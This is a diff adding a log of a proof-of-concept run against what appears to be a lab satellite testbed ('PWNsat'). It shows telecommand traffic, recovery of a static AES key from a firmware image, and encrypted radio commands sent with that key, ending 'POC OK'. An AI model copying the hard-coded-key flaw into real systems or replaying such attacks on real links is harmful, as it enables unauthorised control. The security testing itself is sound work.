@@ -1,0 +1,58 @@
+[   0.000] ========================================================================
+[   0.000] V0-02 static AES key 'PWNsatLabKey1234'
+[   0.000] ========================================================================
+[   1.519] --> HARD RESET (bench parity: fresh board per PoC)
+[   8.852] --> TC apid=0x0A via=usb AES  payload=00
+[   8.904] <-- TM apid=0x0A clear len=3
+[   8.956] --> TC apid=0x1D via=usb clear payload=0101
+[   9.007] <-- TM apid=0x1D clear len=4
+[   9.007] --> TC apid=0x11 via=usb clear payload=00
+[   9.469] <-- TM apid=0x11 clear len=9
+[   9.469] --> TC apid=0x15 via=usb clear payload=001005
+[   9.919] <-- TM apid=0x15 clear len=6
+[   9.919] --> TC apid=0x0D via=usb clear payload=01
+[  10.370] <-- TM apid=0x0D clear len=4
+[  10.411] --> TC apid=0x1D via=usb clear payload=03
+[  10.463] <-- TM apid=0x1D clear len=4
+[  10.463] <-- TM apid=0x09 clear len=9
+[  10.514] --> TC apid=0x1D via=usb clear payload=0a0258
+[  10.566] <-- TM apid=0x1D clear len=4
+[  10.566] --> TC apid=0x10 via=usb clear payload=00
+[  10.618] <-- TM apid=0x10 clear len=4
+[  10.618] --> TC apid=0x21 via=usb clear payload=00
+[  11.069] <-- TM apid=0x21 clear len=6
+[  11.069] --> TC apid=0x24 via=usb clear payload=0000
+[  11.120] <-- TM apid=0x24 clear len=8
+[  11.120] --> TC apid=0x24 via=usb clear payload=0100
+[  11.162] <-- TM apid=0x24 clear len=8
+[  11.162] --> TC apid=0x24 via=usb clear payload=0200
+[  11.214] <-- TM apid=0x24 clear len=8
+[  11.214] --> TC apid=0x24 via=usb clear payload=0300
+[  11.265] <-- TM apid=0x24 clear len=8
+[  11.265] --> TC apid=0x25 via=usb clear payload=0080
+[  11.317] <-- TM apid=0x25 clear len=4
+[  11.317] --> TC apid=0x1E via=usb clear payload=01
+[  11.829] <-- TM apid=0x1E clear len=5
+[  11.829] --> TC apid=0x1D via=usb clear payload=0b
+[  11.922] <-- TM apid=0x1D clear len=4
+[  11.922] --> TC apid=0x05 via=usb clear payload=12
+[  12.380] --> TC apid=0x1F via=usb clear payload=0600000000000000000000000700
+[  12.882] <-- TM apid=0x1F clear len=4
+[  12.882] --> TC apid=0x1F via=usb clear payload=05
+[  13.384] <-- TM apid=0x1F clear len=4
+[  13.384] --> TC apid=0x0A via=usb clear payload=01
+[  13.428] <-- TM apid=0x0A AES len=3
+[  21.521] --> TC apid=0x14 via=usb AES  payload=406c841500e055bb801a060008
+[  30.004] <-- TM apid=0x0E AES len=18
+[  30.004] --> REARM (bench parity: fresh board, pre-PoC)
+[  30.118] key recovered from firmware image: b'PWNsatLabKey1234'
+[  30.118] --> TC apid=0x0C via=radio AES  payload=-
+[  30.172] <-- TM apid=0x0C AES len=27
+[  30.173] decrypted GET_STATUS payload: 01019f1f120a0a08000094031b0000000000000000000000000104
+[  30.173] --> TC apid=0x03 via=radio AES  payload=-
+[  30.635] <-- TM apid=0x03 AES len=5
+[  30.635] attacker holding the firmware image speaks the link natively
+[  30.635] -- console tail: [TC - SPP] APID=0x005 SEQ=1 LEN=1 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x01F SEQ=1 LEN=14 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x01F SEQ=1 LEN=1 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x00A SEQ=1 LEN=1 FLAGS=1 SEC_HDR=NO | [INFO] Secure link enabled | [TC - SPP] APID=0x026 SEQ=1 LEN=1 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x026 SEQ=1 LEN=1 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x014 SEQ=1 LEN=16 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x027 SEQ=1 LEN=1 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x026 SEQ=1 LEN=1 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x027 SEQ=1 LEN=29 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x00C SEQ=1 LEN=16 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x027 SEQ=1 LEN=29 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x003 SEQ=1 LEN=16 FLAGS=1 SEC_HDR=NO
+[  30.635] ========================================================================
+[  30.635] POC OK
+[  30.635] ========================================================================
